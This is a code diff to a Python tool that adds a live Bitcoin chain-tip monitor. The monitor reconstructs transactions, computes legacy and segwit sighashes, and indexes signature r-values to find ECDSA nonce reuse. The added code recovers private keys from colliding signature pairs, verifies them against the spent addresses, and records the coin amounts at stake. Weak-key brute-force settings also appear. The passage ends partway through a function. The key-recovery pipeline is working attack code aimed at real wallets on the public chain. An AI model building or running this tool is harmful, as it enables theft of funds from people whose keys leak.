@@ -244,6 +244,35 @@ ETH_MAX_STEPS       = max(1000, _env_int("ETH_MAX_STEPS", 5_000_000, 1000))
 ETH_MAX_TOTAL_STEPS = max(ETH_MAX_STEPS,
                           _env_int("ETH_MAX_TOTAL_STEPS", 20_000_000, 1000))
 ETH_MAX_WEAK_KEYS   = _env_int("ETH_MAX_WEAK_KEYS", 2_000_000, 1)
+
+# ── Live block monitor (/live) ────────────────────────────────────────────
+# Follows the chain tip and looks for ECDSA nonce reuse in the signatures that
+# new blocks actually spend with. Esplora serves 25 transactions per page, so
+# one block costs ceil(tx_count/25) requests and NO per-transaction fetch: the
+# raw transaction is re-serialised locally from the JSON (verified byte-exact
+# against the BIP-143 vectors in tests/test_live.py).
+LIVE_ENABLED        = bool(_env_int("LIVE_ENABLED", 1, 0))
+LIVE_POLL_SECS      = max(5.0, float(os.environ.get("LIVE_POLL_SECS", "15")))
+LIVE_PAGE           = 25                       # Esplora's fixed /txs page size
+LIVE_MAX_BLOCKS     = max(1, _env_int("LIVE_MAX_BLOCKS", 144, 1))   # ~one day
+# The (r) index is the collision detector, so it is kept in SQLite, not in RAM:
+# a rolling window of blocks stays bounded, and a restart resumes instead of
+# forgetting every r it has already seen.
+LIVE_WINDOW_BLOCKS  = max(1, _env_int("LIVE_WINDOW_BLOCKS", 2016, 1))  # ~2 weeks
+LIVE_SIG_ROWS_MAX   = max(1000, _env_int("LIVE_SIG_ROWS_MAX", 20_000_000, 1000))
+# A height that keeps failing (throttling, a broken endpoint) is retried this
+# many times and then the run stops as partial — it never spins forever, and it
+# never counts an unread block as scanned.
+LIVE_HEIGHT_RETRIES = max(1, _env_int("LIVE_HEIGHT_RETRIES", 5, 1))
+# Hard page bound per block: 25 tx per page, so this is a 500k-tx block.
+LIVE_MAX_PAGES      = max(1, _env_int("LIVE_MAX_PAGES", 20_000, 1))
+# Esplora serves 50 address transactions per page; the old scan read the first
+# page and stopped, which silently reported "0 signatures" for any busy address.
+NONCE_TXS_PAGE      = 50
+NONCE_MAX_TXS       = max(50, _env_int("NONCE_MAX_TXS", 5_000, 50))
+# Only used to estimate a live run up front; the real cost is decided by each
+# block's own tx_count.
+LIVE_AVG_TXS        = max(1, _env_int("LIVE_AVG_TXS", 3_000, 1))
 # Default slice of each era taken by one "Era batch" run. The era windows are
 # billions of timestamps wide (Era 3 alone is 63 billion ms), so a batch run
 # sweeps this many steps from the start of each selected era — or from
@@ -1506,9 +1535,15 @@ def _esplora_status(bases=None):
                          if left > 0 else f"{_esplora_host(b)}: ok")
         return "  ".join(parts)
 
-def _esplora_get(path, should_stop=None):
-    """GET one Esplora path: cache, pacing, 429 cooldown, endpoint rotation."""
-    hit = _esplora_cache_get(path)
+def _esplora_get(path, should_stop=None, cache=True):
+    """GET one Esplora path: cache, pacing, 429 cooldown, endpoint rotation.
+
+    `cache=False` is for data that changes by itself — the chain tip, the
+    mempool, a block that has not been mined yet. A tip-following monitor that
+    read the tip through the cache would wait forever for a block it had
+    already been told does not exist.
+    """
+    hit = _esplora_cache_get(path) if cache else None
     if hit is not None:
         return hit
     last_err = None
@@ -1545,7 +1580,8 @@ def _esplora_get(path, should_stop=None):
             last_err = e
             continue
         _esplora_rate_ok(base)
-        _esplora_cache_put(path, text)
+        if cache:
+            _esplora_cache_put(path, text)
         return text
     if isinstance(last_err, _EsploraRateLimited):
         raise last_err
@@ -1598,6 +1634,308 @@ def _parse_address_lines(data):
         addresses.append(token)
     return addresses, skipped, duplicates
 
+# ══════════════════════════════════════════════════════════════════════
+# Transaction parsing and BIP-143 (segwit v0) sighash
+#
+# Needed because almost every transaction in a live block spends a segwit
+# output: its signature lives in the witness, and its message hash is the
+# BIP-143 digest, not the legacy one. A live nonce-reuse scanner that only
+# understands legacy scriptSig would look at a small and shrinking minority of
+# the chain. Verified against the published BIP-143 vectors (Native P2WPKH and
+# P2SH-P2WPKH) in tests/test_live.py.
+# ══════════════════════════════════════════════════════════════════════
+SIGHASH_ALL, SIGHASH_NONE, SIGHASH_SINGLE = 1, 2, 3
+SIGHASH_ANYONECANPAY = 0x80
+_ZERO32 = b"\x00" * 32
+
+
+def _tx_varint(b, p):
+    n = b[p]
+    if n < 0xfd:
+        return n, p + 1
+    if n == 0xfd:
+        return int.from_bytes(b[p + 1:p + 3], "little"), p + 3
+    if n == 0xfe:
+        return int.from_bytes(b[p + 1:p + 5], "little"), p + 5
+    return int.from_bytes(b[p + 1:p + 9], "little"), p + 9
+
+
+def _tx_put_varint(n):
+    if n < 0xfd:
+        return bytes([n])
+    if n <= 0xFFFF:
+        return b"\xfd" + int(n).to_bytes(2, "little")
+    if n <= 0xFFFFFFFF:
+        return b"\xfe" + int(n).to_bytes(4, "little")
+    return b"\xff" + int(n).to_bytes(8, "little")
+
+
+def _tx_put_script(s):
+    return _tx_put_varint(len(s)) + s
+
+
+def _parse_tx(raw):
+    """Witness-aware parse of a serialised transaction.
+
+    Returns (version4, inputs, outputs, locktime4, segwit) where each input is
+    {"outpoint": 36 bytes, "scriptsig": bytes, "sequence": 4 bytes,
+    "witness": [bytes, ...]}, or None if the bytes are not a transaction. A live
+    scanner is fed by a third-party API, so malformed input is a normal case,
+    not an exception to propagate.
+    """
+    try:
+        if len(raw) < 10:
+            return None
+        p = 0
+        version = raw[p:p + 4]; p += 4
+        segwit = False
+        if raw[p] == 0x00 and raw[p + 1] in (0x01,):
+            segwit = True
+            p += 2
+        n_in, p = _tx_varint(raw, p)
+        if n_in == 0 or n_in > 100_000:
+            return None
+        inputs = []
+        for _ in range(n_in):
+            outpoint = raw[p:p + 36]; p += 36
+            slen, p = _tx_varint(raw, p)
+            scriptsig = raw[p:p + slen]; p += slen
+            sequence = raw[p:p + 4]; p += 4
+            inputs.append({"outpoint": outpoint, "scriptsig": scriptsig,
+                           "sequence": sequence, "witness": []})
+        n_out, p = _tx_varint(raw, p)
+        if n_out > 100_000:
+            return None
+        outputs = []
+        for _ in range(n_out):
+            value = raw[p:p + 8]; p += 8
+            slen, p = _tx_varint(raw, p)
+            outputs.append({"value": value, "script": raw[p:p + slen]})
+            p += slen
+        if segwit:
+            for inp in inputs:
+                n_items, p = _tx_varint(raw, p)
+                wit = []
+                for _ in range(n_items):
+                    ilen, p = _tx_varint(raw, p)
+                    wit.append(raw[p:p + ilen]); p += ilen
+                inp["witness"] = wit
+        locktime = raw[p:p + 4]
+        if len(locktime) < 4:
+            return None
+        return version, inputs, outputs, locktime, segwit
+    except Exception:
+        return None
+
+
+def _serialize_tx(version, inputs, outputs, locktime, segwit):
+    """Inverse of _parse_tx, byte-exact (BIP-143 publishes both forms)."""
+    out = bytearray(version)
+    if segwit:
+        out += b"\x00\x01"
+    out += _tx_put_varint(len(inputs))
+    for i in inputs:
+        out += i["outpoint"] + _tx_put_script(i["scriptsig"]) + i["sequence"]
+    out += _tx_put_varint(len(outputs))
+    for o in outputs:
+        out += o["value"] + _tx_put_script(o["script"])
+    if segwit:
+        for i in inputs:
+            wit = i.get("witness") or []
+            out += _tx_put_varint(len(wit))
+            for item in wit:
+                out += _tx_put_script(item)
+    out += locktime
+    return bytes(out)
+
+
+def _bip143_sighash(raw, input_idx, script_code, amount, htype=SIGHASH_ALL):
+    """The BIP-143 digest for one segwit v0 input, as a big-endian integer.
+
+    `amount` is the value of the output being spent, in satoshis — BIP-143
+    commits to it, which is exactly why segwit fixed the "amount not signed"
+    problem. Returns None if the transaction does not parse or the index is out
+    of range. OP_CODESEPARATOR handling inside a P2WSH witnessScript is NOT
+    implemented: the whole witnessScript is used, which is correct for the
+    overwhelming majority of P2WSH scripts and documented as a limitation.
+    """
+    parsed = _parse_tx(raw)
+    if not parsed:
+        return None
+    version, inputs, outputs, locktime, _segwit = parsed
+    if not 0 <= input_idx < len(inputs):
+        return None
+    base = htype & 0x1F
+    anyone = bool(htype & SIGHASH_ANYONECANPAY)
+    if anyone:
+        hash_prevouts = _ZERO32
+    else:
+        hash_prevouts = sha256d(b"".join(i["outpoint"] for i in inputs))
+    if anyone or base in (SIGHASH_NONE, SIGHASH_SINGLE):
+        hash_sequence = _ZERO32
+    else:
+        hash_sequence = sha256d(b"".join(i["sequence"] for i in inputs))
+    if base not in (SIGHASH_NONE, SIGHASH_SINGLE):
+        hash_outputs = sha256d(b"".join(
+            o["value"] + _tx_put_script(o["script"]) for o in outputs))
+    elif base == SIGHASH_SINGLE and input_idx < len(outputs):
+        o = outputs[input_idx]
+        hash_outputs = sha256d(o["value"] + _tx_put_script(o["script"]))
+    else:
+        hash_outputs = _ZERO32
+    me = inputs[input_idx]
+    pre = (version + hash_prevouts + hash_sequence + me["outpoint"]
+           + _tx_put_script(script_code)
+           + int(amount).to_bytes(8, "little") + me["sequence"]
+           + hash_outputs + locktime + int(htype).to_bytes(4, "little"))
+    return int.from_bytes(sha256d(pre), "big")
+
+
+def _tx_from_esplora(tx):
+    """Re-serialise an Esplora transaction JSON object.
+
+    Esplora's /block/<hash>/txs already carries version, locktime, every vin
+    (outpoint, scriptSig, sequence, witness) and every vout (value, script), so
+    the raw bytes can be rebuilt locally. That is one request per 25
+    transactions instead of two per transaction — the difference between a live
+    scan that keeps up with the tip and one that never does.
+    """
+    try:
+        vin = tx.get("vin") or []
+        vout = tx.get("vout") or []
+        if not vin:
+            return None
+        segwit = any(i.get("witness") for i in vin)
+        inputs = []
+        for i in vin:
+            if i.get("is_coinbase") or not i.get("txid"):
+                # coinbase has no outpoint to sign; represent it as 36 zero bytes
+                inputs.append({"outpoint": _ZERO32 + b"\xff\xff\xff\xff",
+                               "scriptsig": bytes.fromhex(i.get("scriptsig") or ""),
+                               "sequence": int(i.get("sequence", 0)).to_bytes(4, "little"),
+                               "witness": []})
+                continue
+            outpoint = (bytes.fromhex(i["txid"])[::-1]
+                        + int(i.get("vout", 0)).to_bytes(4, "little"))
+            inputs.append({
+                "outpoint": outpoint,
+                "scriptsig": bytes.fromhex(i.get("scriptsig") or ""),
+                "sequence": int(i.get("sequence", 0)).to_bytes(4, "little"),
+                "witness": [bytes.fromhex(w) for w in (i.get("witness") or [])],
+            })
+        outputs = [{"value": int(o.get("value", 0)).to_bytes(8, "little"),
+                    "script": bytes.fromhex(o.get("scriptpubkey") or "")}
+                   for o in vout]
+        return _serialize_tx(int(tx.get("version", 2)).to_bytes(4, "little"),
+                             inputs, outputs,
+                             int(tx.get("locktime", 0)).to_bytes(4, "little"),
+                             segwit)
+    except Exception:
+        return None
+
+
+def _script_pushes(script, strict=True):
+    """The data pushes of a script, in order (best effort).
+
+    `strict=True` stops at the first opcode, which is what a scriptSig or a
+    P2SH redeemScript needs: the pushes are all there is. `strict=False` steps
+    over opcodes and keeps going, which is how the pubkeys embedded in a
+    multisig witnessScript (… CHECKSIGVERIFY OP_CODESEPARATOR … CHECKSIG) are
+    collected. A false candidate costs nothing — it simply will not match a
+    recovered key.
+    """
+    out = []
+    p = 0
+    try:
+        while p < len(script):
+            op = script[p]; p += 1
+            if 0x01 <= op <= 0x4B:
+                out.append(script[p:p + op]); p += op
+            elif op == 0x4C:                       # OP_PUSHDATA1
+                n = script[p]; p += 1
+                out.append(script[p:p + n]); p += n
+            elif op == 0x4D:                       # OP_PUSHDATA2
+                n = int.from_bytes(script[p:p + 2], "little"); p += 2
+                out.append(script[p:p + n]); p += n
+            elif op == 0x4E:                       # OP_PUSHDATA4
+                n = int.from_bytes(script[p:p + 4], "little"); p += 4
+                out.append(script[p:p + n]); p += n
+            elif strict:
+                break                              # an opcode, not a push
+    except Exception:
+        pass
+    return out
+
+
+def _p2wpkh_script_code(pubkey):
+    """scriptCode for a P2WPKH input: the equivalent P2PKH script (BIP-141).
+
+    Returned WITHOUT its length prefix — the BIP-143 preimage serialises the
+    scriptCode like a CTxOut script, so the caller adds the varint. BIP-143
+    prints the field already prefixed (`1976a914…88ac`), which is why the
+    published examples look like they carry a leading 0x19.
+    """
+    return b"\x76\xa9\x14" + hash160(pubkey) + b"\x88\xac"
+
+
+def _legacy_script_code(scriptsig, spk):
+    """The script a legacy signature actually commits to.
+
+    For P2SH the signed script is the redeemScript (the last push), not the
+    `OP_HASH160 <hash> OP_EQUAL` wrapper — using the wrapper produces a wrong
+    digest and a silently failed key recovery.
+    """
+    if len(spk) == 23 and spk[0] == 0xA9 and spk[-1] == 0x87:
+        pushes = _script_pushes(scriptsig)
+        if pushes:
+            return pushes[-1]
+    return spk
+
+
+BECH32M_CONST = 0x2bc830a3
+
+
+def _bech32_checksum(hrp, data, const):
+    values = _bech32_hrp_expand(hrp) + data
+    polymod = _bech32_polymod(values + [0] * 6) ^ const
+    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]
+
+
+def segwit_address(witver, program, hrp="bc"):
+    """BIP-173 (v0) / BIP-350 (v1+) segwit address for a witness program."""
+    data = [witver] + _convertbits(program, 8, 5)
+    const = 1 if witver == 0 else BECH32M_CONST
+    return hrp + "1" + "".join(BECH32[d] for d in
+                               data + _bech32_checksum(hrp, data, const))
+
+
+def scriptpubkey_to_address(spk, hrp="bc"):
+    """(kind, address) for the five standard output types, else ("other", "").
+
+    The live monitor reports the address whose key just leaked, so it has to
+    decode whatever the prevout was paying to — not only P2PKH.
+    """
+    n = len(spk)
+    if n == 25 and spk[0] == 0x76 and spk[1] == 0xA9 and spk[2] == 0x14 \
+            and spk[23] == 0x88 and spk[24] == 0xAC:
+        return "p2pkh", p2pkh_address_from_hash160(spk[3:23])
+    if n == 23 and spk[0] == 0xA9 and spk[1] == 0x14 and spk[22] == 0x87:
+        return "p2sh", b58check(b"\x05" + spk[2:22])
+    if n == 22 and spk[0] == 0x00 and spk[1] == 0x14:
+        return "p2wpkh", segwit_address(0, spk[2:])
+    if n == 34 and spk[0] == 0x00 and spk[1] == 0x20:
+        return "p2wsh", segwit_address(0, spk[2:])
+    if n == 34 and spk[0] == 0x51:
+        return "p2tr", segwit_address(1, spk[2:])
+    if 4 <= n <= 42 and 0x52 <= spk[0] <= 0x60 and spk[1] == 0x20:
+        return "p2tr", segwit_address(spk[0] - 0x50, spk[2:])
+    return "other", ""
+
+
+def p2pkh_address_from_hash160(h160, mainnet_prefix=b"\x00"):
+    return b58check(mainnet_prefix + h160)
+
+
 def _parse_der_sig(sig):
     """Return (r, s, sighash_type) or None."""
     if len(sig) < 9 or sig[0] != 0x30: return None
@@ -1615,8 +1953,21 @@ def _parse_der_sig(sig):
         return None
 
 def _legacy_sighash(raw_tx, input_idx, prevout_script, htype=1):
-    """Bitcoin legacy SIGHASH_ALL computation."""
+    """Bitcoin legacy sighash (SIGHASH_ALL and the other base types).
+
+    The legacy digest is over the transaction *without* witness data, so a
+    witness-serialised transaction — which is what a mixed tx looks like when a
+    legacy P2PKH input is spent alongside a segwit one — is stripped back to its
+    non-witness form first. Digesting the marker/flag bytes would give a wrong z
+    that still looks plausible, and a wrong z turns a real nonce reuse into a
+    candidate key that fails verification.
+    """
     try:
+        parsed = _parse_tx(raw_tx)
+        if parsed and parsed[4]:
+            raw_tx = _serialize_tx(
+                parsed[0], [dict(i, witness=[]) for i in parsed[1]],
+                parsed[2], parsed[3], False)
         # parse tx
         def varint(b, p):
             n = b[p]; p += 1
@@ -1662,62 +2013,445 @@ def _legacy_sighash(raw_tx, input_idx, prevout_script, htype=1):
     except Exception:
         return None
 
-def _fetch_sigs_for_address(addr, log, should_stop=None):
-    """Fetch all (r,s,z) signatures for an address via Esplora."""
+def _segwit_script_code(spk, scriptsig, witness):
+    """(script_code, kind) for a segwit input, or (None, kind) if unsupported.
+
+    The program is cross-checked against the witness data: for P2WPKH the
+    witness pubkey must hash160 to the program, and for P2WSH the witnessScript
+    must SHA256 to it. A mismatch means the prevout and the witness do not
+    belong together, and any digest computed from them would be wrong — so it is
+    better to skip the input than to poison the collision index with a bogus z.
+    """
+    n = len(spk)
+    if n == 34 and spk[0] == 0x51:
+        return None, "taproot"            # BIP-341 sighash, not BIP-143
+    if n == 22 and spk[0] == 0x00 and spk[1] == 0x14:
+        prog, kind = spk[2:], "p2wpkh"
+    elif n == 34 and spk[0] == 0x00 and spk[1] == 0x20:
+        prog, kind = spk[2:], "p2wsh"
+    elif n == 23 and spk[0] == 0xA9 and spk[1] == 0x14 and spk[22] == 0x87:
+        # P2SH-wrapped segwit: the witness program is the redeemScript, which is
+        # the LAST scriptSig push. Real wallets wrap it one more time — the push
+        # is `16 0014<hash>`, i.e. the redeemScript is a single push of the
+        # 22-byte program — so both shapes are accepted.
+        pushes = _script_pushes(scriptsig)
+        rs = pushes[-1] if pushes else b""
+        inner = _script_pushes(rs)
+        prog = kind = None
+        for cand in ((rs,) + tuple(inner)):
+            if len(cand) == 22 and cand[0] == 0x00 and cand[1] == 0x14:
+                prog, kind = cand[2:], "p2sh-p2wpkh"
+                break
+            if len(cand) == 34 and cand[0] == 0x00 and cand[1] == 0x20:
+                prog, kind = cand[2:], "p2sh-p2wsh"
+                break
+        if prog is None:
+            return None, "p2sh-other"
+    else:
+        return None, ""
+    if kind.endswith("wpkh"):
+        for item in reversed(witness):
+            if len(item) in (33, 65) and hash160(item) == prog:
+                return _p2wpkh_script_code(item), kind
+        return None, kind + "-unmatched"
+    if witness and sha256(witness[-1]) == prog:
+        # OP_CODESEPARATOR truncation inside a P2WSH script is not implemented.
+        return witness[-1], kind
+    return None, kind + "-unmatched"
+
+
+def _tx_signatures(tx):
+    """Every ECDSA signature in one Esplora transaction JSON.
+
+    Returns (sigs, stats). `sigs` entries carry the txid, input index, r, s, z,
+    sighash type, address kind, the signing pubkey when it is recoverable and
+    the address being spent. `stats` counts what was skipped and why, so the UI
+    can report the truth instead of a number that silently omits Taproot.
+    """
+    stats = {"inputs": 0, "sigs": 0, "segwit": 0, "legacy": 0, "taproot": 0,
+             "no_prevout": 0, "bad_digest": 0, "no_der": 0}
     sigs = []
+    raw = _tx_from_esplora(tx)
+    parsed = _parse_tx(raw) if raw else None
+    if not parsed:
+        return sigs, stats
+    txid = tx.get("txid") or ""
+    vin_json = tx.get("vin") or []
+    for idx, inp in enumerate(vin_json):
+        stats["inputs"] += 1
+        prev = inp.get("prevout") or {}
+        spk_hex = prev.get("scriptpubkey") or ""
+        if not spk_hex or "value" not in prev:
+            stats["no_prevout"] += 1
+            continue
+        spk = bytes.fromhex(spk_hex)
+        amount = prev.get("value") or 0
+        witness = [bytes.fromhex(w) for w in (inp.get("witness") or [])]
+        scriptsig = bytes.fromhex(inp.get("scriptsig") or "")
+        # The scriptPubKey is authoritative: decode it locally and only fall
+        # back to the address Esplora reports for a script we cannot decode.
+        # Trusting the API field first would report the wrong address whenever
+        # the two disagree.
+        kind0, addr = scriptpubkey_to_address(spk)
+        addr = addr or prev.get("scriptpubkey_address") or ""
+        pushes, use_bip143 = [], False
+        if witness:
+            script_code, kind = _segwit_script_code(spk, scriptsig, witness)
+            if kind == "taproot":
+                stats["taproot"] += 1
+                continue
+            pushes = list(witness)
+            use_bip143 = True
+        else:
+            if kind0 == "taproot":
+                stats["taproot"] += 1
+                continue
+            script_code = _legacy_script_code(scriptsig, spk)
+            kind = kind0 or "legacy"
+            pushes = _script_pushes(scriptsig)
+        if script_code is None:
+            stats["bad_digest"] += 1
+            continue
+        der = [(p, _parse_der_sig(p)) for p in pushes]
+        der = [(p, d) for p, d in der if d]
+        if not der:
+            stats["no_der"] += 1
+            continue
+        # Every pubkey this input could have signed with: the data pushes, plus
+        # — for P2WSH — the keys embedded in the witnessScript, where a multisig
+        # keeps them. A recovered key is only provable against one of these, so
+        # collecting them all is what makes an exotic script verifiable at all.
+        pub_pool = [pp for pp in pushes if len(pp) in (33, 65)]
+        if use_bip143 and kind.endswith("wsh"):
+            pub_pool += [pp for pp in _script_pushes(script_code, strict=False)
+                         if len(pp) in (33, 65) and pp not in pub_pool]
+        pub = pub_pool[-1] if pub_pool else b""
+        for item, (r, s, htype) in der:
+            if use_bip143:
+                z = _bip143_sighash(raw, idx, script_code, amount, htype)
+            else:
+                z = _legacy_sighash(raw, idx, script_code, htype)
+            if z is None:
+                stats["bad_digest"] += 1
+                continue
+            stats["sigs"] += 1
+            stats["segwit" if use_bip143 else "legacy"] += 1
+            sigs.append({"txid": txid, "vin": idx, "r": r, "s": s, "z": z,
+                         "htype": htype, "kind": kind, "spk": spk_hex,
+                         "pubs": ",".join(pp.hex() for pp in pub_pool),
+                         "pubkey": item_pubkey(pushes, item) or pub.hex(),
+                         "addr": addr, "amount": amount,
+                         "type": "segwit" if use_bip143 else "legacy"})
+    return sigs, stats
+
+
+def item_pubkey(pushes, sig_item):
+    """The pubkey that belongs to `sig_item` inside one input's pushes.
+
+    For the standard single-signature layouts the pubkey is the next data push
+    after the signature. Anything else (bare multisig, custom scripts) returns
+    "" and the caller falls back to the input's pubkey guess or to the prevout
+    script for verification.
+    """
     try:
-        txt = _esplora_get(f"/address/{addr}/txs", should_stop)
-        txs = json.loads(txt)
-    except (_EsploraRateLimited, RuntimeError) as e:
-        if isinstance(e, _EsploraRateLimited) or "stopped by user" in str(e):
-            raise                    # do NOT report this as "0 signatures"
-        log(f"[nonce] address fetch failed: {e}")
-        return sigs
-    except Exception as e:
-        log(f"[nonce] address fetch failed: {e}")
-        return sigs
-    log(f"[nonce] {len(txs)} transactions for {addr}")
+        i = pushes.index(sig_item)
+    except ValueError:
+        return ""
+    for nxt in pushes[i + 1:]:
+        if len(nxt) in (33, 65):
+            return nxt.hex()
+    return ""
+
+
+def recover_keys_from_pair(r, s1, z1, s2, z2):
+    """Every private key implied by two signatures sharing the nonce r.
+
+    ECDSA with a repeated k leaks the key outright:
+        s1 - s2 = k^-1 (z1 - z2)   ->   k = (z1 - z2)/(s1 - s2)
+        d = (s1*k - z1) / r
+    Only r (the x coordinate of R) is on chain, so the nonce is known up to
+    sign: both k and -k are tried. A third case matters in practice — a signer
+    that low-S-normalises one signature and not the other (BIP-147) uses k for
+    one and -k for the other, which yields d directly without k:
+        d = -(s2*z1 + s1*z2) / (r*(s1 + s2))
+    Returns the de-duplicated candidate keys; each still has to be verified
+    against the pubkey or address it signed for before it counts as a hit.
+    """
+    out = []
+    if not 0 < r < N:
+        return out
+    try:
+        rinv = pow(r, -1, N)
+    except Exception:
+        return out
+
+    def _add(d):
+        d %= N
+        if 0 < d < N and d not in out:
+            out.append(d)
+
+    den = (s1 - s2) % N
+    if den and (z1 - z2) % N:
+        k = ((z1 - z2) * pow(den, -1, N)) % N
+        for kk in (k, (-k) % N):
+            if kk == 0:
+                continue
+            _add((s1 * kk - z1) * rinv)
+            _add((s2 * kk - z2) * rinv)
+    tot = (s1 + s2) % N
+    if tot:
+        _add((-(s2 * z1 + s1 * z2)) * pow(tot * r % N, -1, N))
+    return out
+
+
+def verify_recovered_key(d, pubkeys=(), addresses=(), scriptpubkeys=()):
+    """Prove a recovered key really owns the signatures it was derived from.
+
+    Matching the signing pubkey is conclusive; matching an address or a
+    scriptPubKey hash covers multisig inputs where the pubkey is ambiguous.
+    Returns the matched evidence string, or "" when nothing matches — which is
+    the normal outcome of a bad sighash parse, never of a real recovery.
+    """
+    pubs = derive_pubkeys(d)
+    if not pubs:
+        return ""
+    cpub, upub = pubs
+    want = {p.lower() for p in pubkeys if p}
+    if want:
+        if cpub.hex() in want:
+            return "pubkey:" + cpub.hex()
+        if upub.hex() in want:
+            return "pubkey:" + upub.hex()
+    hc, hu = hash160(cpub), hash160(upub)
+    for spk in scriptpubkeys:
+        if not spk:
+            continue
+        b = bytes.fromhex(spk) if isinstance(spk, str) else spk
+        for h in (hc, hu):
+            if h and h in b:
+                return "scriptpubkey:" + scriptpubkey_to_address(b)[1]
+    addrs = {a for a in addresses if a}
+    if addrs:
+        for _label, addr in derive_addresses(d):
+            if addr in addrs:
+                return "address:" + addr
+    return ""
+
+
+# ──────────────────────────────────────────────────────────────────────
+# Live signature index (SQLite, rolling window of blocks)
+#
+# An r-collision detector has to remember every r it has seen, and a tip
+# follower runs forever — so the index lives in SQLite with a bounded window of
+# blocks instead of in an in-process dict that grows without limit and forgets
+# everything on restart.
+# ──────────────────────────────────────────────────────────────────────
+_LIVE_SCHEMA_OK = False
+
+
+def _live_schema():
+    """Add columns that were introduced after a database was first created.
+
+    The database outlives a deploy, so a new column has to be added to tables
+    that already exist instead of only to CREATE TABLE IF NOT EXISTS.
+    """
+    global _LIVE_SCHEMA_OK
+    if _LIVE_SCHEMA_OK:
+        return
+    try:
+        with _db() as c:
+            cols = {r[1] for r in c.execute("PRAGMA table_info(live_sigs)")}
+            if "amount" not in cols:
+                c.execute("ALTER TABLE live_sigs ADD COLUMN amount "
+                          "INTEGER NOT NULL DEFAULT 0")
+        _LIVE_SCHEMA_OK = True
+    except Exception:
+        pass
+
+
+def live_state_get(key, default=""):
+    try:
+        with _db() as c:
+            row = c.execute("SELECT v FROM live_state WHERE k=?", (key,)).fetchone()
+        return row[0] if row else default
+    except Exception:
+        return default
+
+
+def live_state_set(key, value):
+    try:
+        with _db() as c:
+            c.execute("INSERT INTO live_state(k,v) VALUES(?,?) "
+                      "ON CONFLICT(k) DO UPDATE SET v=excluded.v",
+                      (key, str(value)))
+    except Exception:
+        pass
+
+
+def live_prune(height, window_blocks=None):
+    """Drop index rows older than the rolling window. Returns rows deleted."""
+    _live_schema()
+    window_blocks = window_blocks or LIVE_WINDOW_BLOCKS
+    cut = int(height) - int(window_blocks)
+    try:
+        with _db() as c:
+            cur = c.execute("DELETE FROM live_sigs WHERE height < ?", (cut,))
+            return cur.rowcount or 0
+    except Exception:
+        return 0
+
+
+def live_reset():
+    _live_schema()
+    try:
+        with _db() as c:
+            c.execute("DELETE FROM live_sigs")
+            c.execute("DELETE FROM live_state")
+    except Exception:
+        pass
+
+
+def live_stats():
+    _live_schema()
+    with _db() as c:
+        rows = c.execute("SELECT COUNT(*), COUNT(DISTINCT r), MIN(height), "
+                         "MAX(height), SUM(amount) FROM live_sigs").fetchone()
+        dupes = c.execute("SELECT COUNT(*) FROM (SELECT r FROM live_sigs "
+                          "GROUP BY r HAVING COUNT(*) > 1)").fetchone()[0]
+    return {"sigs": rows[0] or 0, "distinct_r": rows[1] or 0,
+            "min_height": rows[2] or 0, "max_height": rows[3] or 0,
+            "sat_value": rows[4] or 0, "colliding_r": dupes}
+
+
+def live_index_sigs(sigs, height):
+    """Insert signatures into the index and return any r already present.
+
+    Returns [(sig, [matching rows])] for collisions only. Rows are read before
+    inserting this signature, so a signature never collides with itself.
+    """
+    collisions = []
+    _live_schema()
+    try:
+        with _db() as c:
+            for sg in sigs:
+                rows = c.execute(
+                    "SELECT r,s,z,txid,vin,height,pubkey,addr,kind,amount "
+                    "FROM live_sigs WHERE r=?", (hex(sg["r"]),)).fetchall()
+                if rows:
+                    collisions.append((sg, [
+                        {"r": int(r[0], 16), "s": int(r[1], 16), "z": int(r[2], 16),
+                         "txid": r[3], "vin": r[4], "height": r[5],
+                         "pubkey": r[6], "addr": r[7], "kind": r[8],
+                         "amount": r[9]}
+                        for r in rows]))
+                c.execute(
+                    "INSERT INTO live_sigs(r,s,z,htype,txid,vin,height,pubkey,"
+                    "addr,kind,amount) VALUES(?,?,?,?,?,?,?,?,?,?,?)",
+                    (hex(sg["r"]), hex(sg["s"]), hex(sg["z"]), sg.get("htype", 1),
+                     sg["txid"], sg["vin"], int(height),
+                     sg.get("pubs") or sg.get("pubkey", ""),
+                     sg.get("addr", ""), sg.get("kind", ""),
+                     int(sg.get("amount") or 0)))
+            total = c.execute("SELECT COUNT(*) FROM live_sigs").fetchone()[0]
+            if total > LIVE_SIG_ROWS_MAX:
+                c.execute("DELETE FROM live_sigs WHERE id IN (SELECT id FROM "
+                          "live_sigs ORDER BY height ASC, id ASC LIMIT ?)",
+                          (total - LIVE_SIG_ROWS_MAX,))
+    except Exception:
+        return collisions
+    return collisions
+
+
+def _fetch_address_txs(addr, log, should_stop=None, max_txs=None):
+    """Every confirmed+mempool transaction touching `addr`, paginated.
+
+    Esplora returns 50 per page with a `chain_txs`/`mempool_txs` split; the next
+    page is fetched with the last confirmed txid as the cursor. Stopping after
+    page one is how a scan quietly reports "0 signatures" for a busy address.
+    """
+    max_txs = max_txs or NONCE_MAX_TXS
+    out, seen, cursor, pages = [], set(), "", 0
+    while len(out) < max_txs:
+        path = f"/address/{addr}/txs" + (f"/chain/{cursor}" if cursor else "")
+        try:
+            txs = json.loads(_esplora_get(path, should_stop))
+        except (_EsploraRateLimited, RuntimeError) as e:
+            if isinstance(e, _EsploraRateLimited) or "stopped by user" in str(e):
+                raise                    # do NOT report this as "0 signatures"
+            log(f"[nonce] {path} failed: {e}")
+            break
+        except Exception as e:
+            log(f"[nonce] {path} failed: {e}")
+            break
+        pages += 1
+        new = 0
+        for tx in txs:
+            txid = tx.get("txid")
+            if not txid or txid in seen:
+                continue
+            seen.add(txid); out.append(tx); new += 1
+        if not txs or new == 0:
+            break
+        cursor = txs[-1].get("txid") or ""
+        if not cursor or len(txs) < 2:
+            break
+        if len(out) >= max_txs:
+            log(f"[nonce] reached the NONCE_MAX_TXS={max_txs:,} cap after "
+                f"{pages} page(s) — the address has more history than was read")
+            break
+    if should_stop:
+        try:
+            mem = json.loads(_esplora_get(f"/address/{addr}/txs/mempool", should_stop))
+            for tx in mem or []:
+                txid = tx.get("txid")
+                if txid and txid not in seen:
+                    seen.add(txid); out.append(tx)
+        except Exception:
+            pass
+    return out
+
+
+def _fetch_sigs_for_address(addr, log, should_stop=None, txs=None):
+    """Every (r,s,z) signature made by the key(s) paying to `addr`.
+
+    Both signature layouts are covered: legacy scriptSig (message hash from
+    `_legacy_sighash`) and segwit witness (BIP-143 digest). The raw transaction
+    is re-serialised locally from the JSON Esplora already returned, so this
+    costs one request per 50 transactions instead of one per transaction.
+    """
+    sigs = []
+    if txs is None:
